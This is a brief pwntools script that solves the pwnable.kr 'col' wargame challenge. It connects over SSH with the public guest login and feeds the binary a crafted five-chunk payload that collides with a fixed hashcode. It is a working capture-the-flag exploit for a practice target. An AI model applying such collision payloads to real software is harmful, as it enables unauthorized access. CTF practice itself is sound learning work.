from pwn import *


def exploit():
    # connect through ssh
    s = ssh('col', 'pwnable.kr', password='guest', port=2222)
    # hashcode from source code
    hashcode = 0x21DD09EC
    # calculate the one peace of hascode
    one_peace = hashcode // 5
    # calculate the last part cause we have hashcode % 5 != 0
    last_part = hashcode - one_peace * 4
    # Create paylaod to argv[1]
    payload = p32(one_peace) * 4 + p32(last_part)
    p = s.process(executable='./col', argv=['./col', payload])
    p.sendline(payload)
    p.interactive()


if __name__=='__main__':
    exploit()
